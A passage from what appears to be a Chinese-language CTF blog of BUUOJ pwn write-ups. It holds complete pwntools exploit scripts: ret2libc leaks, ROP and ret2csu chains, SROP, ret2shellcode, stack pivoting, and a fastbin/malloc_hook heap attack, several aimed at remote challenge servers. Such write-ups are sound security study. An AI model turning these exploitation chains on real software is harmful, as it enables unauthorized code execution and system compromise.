class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x080482ea</span></span><br><span class="line"><span class="comment">#payload = "a"*(0x48+4)+p32(puts_plt)+p32(main)+p32(printf_got)</span></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf_addr = u32(p.recvuntil("\xf7")[-4:])</span></span><br><span class="line"><span class="comment"># print(hex(printf_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># obj = LibcSearcher("printf",printf_addr)</span></span><br><span class="line"><span class="comment"># libc_base = printf_addr - obj.dump("printf")</span></span><br><span class="line"><span class="comment"># system_addr = libc_base + obj.dump("system")</span></span><br><span class="line"><span class="comment"># binsh = libc_base + obj.dump("str_bin_sh")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendline("administrator")</span></span><br><span class="line"><span class="comment"># p.recvuntil("0.Exit\n:")</span></span><br><span class="line"><span class="comment"># p.sendline("1")</span></span><br><span class="line"><span class="comment"># payload = "a"*(0x48+4)+p32(system_addr)+p32(main)+p32(binsh)</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil("0.Exit\n:")</span></span><br><span class="line"><span class="comment"># p.sendline("4")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="10-jarvisoj-level3"><a href="#10-jarvisoj-level3" class="headerlink" title="10. jarvisoj_level3"></a>10. jarvisoj_level3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./level3"</span>)</span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27215</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"read"</span>,read_addr)</span><br><span class="line">libc_base = read_addr - obj.dump(<span class="string">"read"</span>)</span><br><span class="line">system = libc_base + obj.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh = libc_base + obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="11-jarvisoj-tell-me-something"><a href="#11-jarvisoj-tell-me-something" class="headerlink" title="11. jarvisoj_tell_me_something"></a>11. jarvisoj_tell_me_something</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./guestbook"</span>)</span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27801</span>)</span><br><span class="line">elf = ELF(<span class="string">"./guestbook"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006f3</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004006f1</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your message:\n"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = (<span class="number">0x88</span>)*<span class="string">'a'</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">libc_base = write_addr - obj.dump(<span class="string">"write"</span>)</span><br><span class="line">system = libc_base + obj.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh = libc_base + obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your message:\n"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = (<span class="number">0x88</span>)*<span class="string">'a'</span>+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="12-ciscn-2019-s-3"><a href="#12-ciscn-2019-s-3" class="headerlink" title="12. ciscn_2019_s_3"></a>12. ciscn_2019_s_3</h2><blockquote>
<p> 比较有意思的题目，，，，一开始忽略了gadget，，，，就没想到，，，</p>
</blockquote>
<p><img src="/2020/11/20/16-35-undefined/image-20210326220901432.png" alt="image-20210326220901432"></p>
<p>有两个gadget，就导致了有两种解法</p>
<h3 id="解法1：ret2csu"><a href="#解法1：ret2csu" class="headerlink" title="解法1：ret2csu"></a>解法1：ret2csu</h3><p>一开始有栈溢出，，，</p>
<p>然后有gadget可以设置rax，syscall执行evecve</p>
<p>所以只需要设置参数，rdi，rdx和rsi</p>
<p>rdi有gadget，但是rdx没有，，，所以为了设置rdx，使用了万能gadget</p>
<p>binsh地址的泄漏是因为输入的地址是rsp-0x10，，，所以两个“/bin/sh\x00”后就可以把rbp/rsp的地址带出来</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">elf = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x04004ED</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span> + p64(vuln)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">binsh = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>) - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#second</span></span><br><span class="line">pop_rax_59 = <span class="number">0x004004E2</span> </span><br><span class="line">part1 = <span class="number">0x00040059A</span></span><br><span class="line">part2 = <span class="number">0x0400580</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span> + p64(pop_rax_59)</span><br><span class="line">payload += p64(part1)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(binsh+<span class="number">0x10</span>)<span class="comment">#suiyi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#only low8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(part2)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="解法2：srop"><a href="#解法2：srop" class="headerlink" title="解法2：srop"></a>解法2：srop</h3><blockquote>
<p>还有一个设置rax = 15的gadget，所以还可以使用srop，并且相比于ret2csu可以大大简化代码</p>
<p>因为参数的设置都在sigreturnframe里面。。。</p>
<p>主要不同主要在第二段代码里面。</p>
<p>直接pop_rax,syscall，这时候rsp的指向下面，，，str(sigframe)，即可</p>
</blockquote>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">elf = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">vuln = <span class="number">0x04004ED</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span> + p64(vuln)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">binsh = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>) - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#second</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line">pop_rax_15 = <span class="number">0x004004DA</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span> + p64(pop_rax_15)+p64(syscall) +str(sigframe)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p><del>其实还是比较简单的题，恕在下无能</del></p>
</blockquote>
<h2 id="13-HarekazeCTF2019-baby-rop2"><a href="#13-HarekazeCTF2019-baby-rop2" class="headerlink" title="13. [HarekazeCTF2019]baby_rop2"></a>13. [HarekazeCTF2019]baby_rop2</h2><blockquote>
<p>就是简单又正常的rop，，，还给了libc，，，，</p>
</blockquote>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">"./babyrop2"</span>)</span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26780</span>)</span><br><span class="line">elf = ELF(<span class="string">"./babyrop2"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(read_got) + p64(printf_plt)+p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">'read'</span>]</span><br><span class="line">system = libc.sym[<span class="string">'system'</span>] + libc_base</span><br><span class="line">binsh = libc.search(<span class="string">"/bin/sh"</span>).next() + libc_base</span><br><span class="line">log.success(binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(binsh) + p64(system)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="14-ez-pz-hackover-2016"><a href="#14-ez-pz-hackover-2016" class="headerlink" title="14. ez_pz_hackover_2016"></a>14. ez_pz_hackover_2016</h2><blockquote>
<p>思路很简单，，就是ret2shellcode的题目，这个可以想到，，，一般没开nx就是了，，，，但是算偏移的东西搞得我有点乱，，，，</p>
</blockquote>
<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>emmm，ida里面给出的是错误的，，，所以用cyclic来算</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cyclic 100</span></span><br><span class="line">payload = <span class="string">'crashme'</span>+<span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"</span></span><br><span class="line"><span class="comment">#Invalid $PC address: 0x61666161</span></span><br><span class="line"><span class="comment">#winter@ubuntu:~/buu$ cyclic -l 0x61666161</span></span><br><span class="line"><span class="comment">#18</span></span><br></pre></td></tr></table></figure>

<p>所以战役粗加上crashme，，，偏移量是18</p>
<h3 id="shellcode偏移"><a href="#shellcode偏移" class="headerlink" title="shellcode偏移"></a>shellcode偏移</h3><p>先随便填之前泄漏的地址，，，，调试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'crashme'</span>+<span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">18</span></span><br><span class="line">payload += p32(addr)</span><br><span class="line">payload += shellcode</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/20/16-35-undefined/image-20210328151124518.png" alt="image-20210328151124518"></p>
<p>所以，，，之前泄漏的地址，和shellcode的地址差0x1c，只要<code>addr - 0x1c</code>即可。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./ez_pz_hackover_2016"</span>)</span><br><span class="line"><span class="comment">#= remote("node3.buuoj.cn",28694)</span></span><br><span class="line">elf = ELF(<span class="string">"./ez_pz_hackover_2016"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">"crash: 0x"</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">print(hex(addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">print(hex(addr+<span class="number">0x1e</span>))</span><br><span class="line">payload = <span class="string">'crashme'</span>+<span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">18</span></span><br><span class="line">payload += p32(addr)</span><br><span class="line">payload += shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="15-ciscn-2019-es-2"><a href="#15-ciscn-2019-es-2" class="headerlink" title="15. ciscn_2019_es_2"></a>15. ciscn_2019_es_2</h2><blockquote>
<p>wuwuwu,,,没做出来，感觉很简单，，，栈迁移</p>
</blockquote>
<p><img src="/2020/11/20/16-35-undefined/image-20210329213719581.png" alt="image-20210329213719581"></p>
<p>两个相同的输入，，，</p>
<p>方法是第一个可以泄露ebp，，，然后后面的话，，，是覆盖main的返回地址，，，就很强，，，</p>
<p><img src="/2020/11/20/16-35-undefined/image-20210329215328891.png" alt="image-20210329215328891"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_2"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27980</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ciscn_2019_es_2"</span>)</span><br><span class="line"></span><br><span class="line">system = elf.sym[<span class="string">'system'</span>]</span><br><span class="line">bss = <span class="number">0x0804A049</span></span><br><span class="line">leave_ret = <span class="number">0x080485FD</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"your name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">ebp = u32(p.recvuntil(<span class="string">'\xff'</span>)[<span class="number">-4</span>:])</span><br><span class="line">print(hex(ebp))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">print(hex(ebp - <span class="number">0x24</span>))</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p32(ebp - <span class="number">0x24</span>) + <span class="string">'bbbb'</span> + p32(system) + <span class="string">'cccc'</span> + p32(ebp - <span class="number">0x1c</span>) + <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">'p'</span>)</span><br><span class="line">payload += p32(ebp - <span class="number">0x2c</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>做过栈迁移的专题吧。。。。卡擦卡擦，，，停一下。。。</p>
<p>第一页over了。。。</p>
<p><img src="/2020/11/20/16-35-undefined/image-20210329215437436.png" alt="image-20210329215437436"></p>
</blockquote>
<hr>
<h2 id="0-vn-pwn-simpleHeap"><a href="#0-vn-pwn-simpleHeap" class="headerlink" title="0.vn_pwn_simpleHeap"></a>0.vn_pwn_simpleHeap</h2><p><img src="/2020/11/20/16-35-undefined/image-20201120094648513.png" alt="image-20201120094648513"></p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120094808176.png" alt="image-20201120094808176"></p>
<p>e = 7 + 7</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x18,&#39;pppp&#39;)</span><br><span class="line">add(0x60,&#39;pppp&#39;)</span><br><span class="line">add(0x60,&#39;pppp&#39;)</span><br><span class="line">add(0x10,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>

<hr>
<p><img src="/2020/11/20/16-35-undefined/image-20201120094858507.png" alt="image-20201120094858507"></p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120094932009.png" alt="image-20201120094932009"></p>
<p>程序以为只有三个了，因为0xe1把0x71覆盖了，但是0x71还是可以用的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&#39;p&#39;*0x18+&#39;\xe1&#39;</span><br><span class="line">edit(0,payload)</span><br></pre></td></tr></table></figure>



<hr>
<p><img src="/2020/11/20/16-35-undefined/image-20201120095055903.png" alt="image-20201120095055903"></p>
<p>放入了unsortedbin中</p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120095130576.png" alt="image-20201120095130576"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>

<hr>
<p><img src="/2020/11/20/16-35-undefined/image-20201120095223789.png" alt="image-20201120095223789"></p>
<p>会把原来unsortedbin中上面的块分走，那么下面里面存放的fd和bk就可以通过原来第二个0x71来输出了。</p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120095331695.png" alt="image-20201120095331695"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>

<hr>
<p>得到了unsortedbin的链表头，可以得到main_arena的地址和libc的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main_arena&#x3D;u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_one_gadget&#x3D;[0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">one_gadget&#x3D;libc_base+libc_one_gadget[1]</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;__libc_realloc&#39;]</span><br><span class="line">fake_chunk&#x3D;malloc_hook-0x23</span><br></pre></td></tr></table></figure>

<hr>
<p><img src="/2020/11/20/16-35-undefined/image-20201120095807801.png" alt="image-20201120095807801"></p>
<p>变回来了，但是第二个0x71有两个块同时指向chunk2和chunk4</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)#5</span><br></pre></td></tr></table></figure>

<hr>
<p>double free?</p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120100035193.png" alt="image-20201120100035193"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(4)</span><br></pre></td></tr></table></figure>

<hr>
<p>这时候，chunk2和chunk4指向同一个，chunk4被释放了，但是chunk2还在，可以fastbin attack？</p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120100330055.png" alt="image-20201120100330055"></p>
<p>修改了fd指针</p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120100417281.png" alt="image-20201120100417281"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;p64(fake_chunk)</span><br><span class="line">edit(2,payload)</span><br></pre></td></tr></table></figure>

<hr>
<p><img src="/2020/11/20/16-35-undefined/image-20201120100443552.png" alt="image-20201120100443552"></p>
<p>申请回来</p>
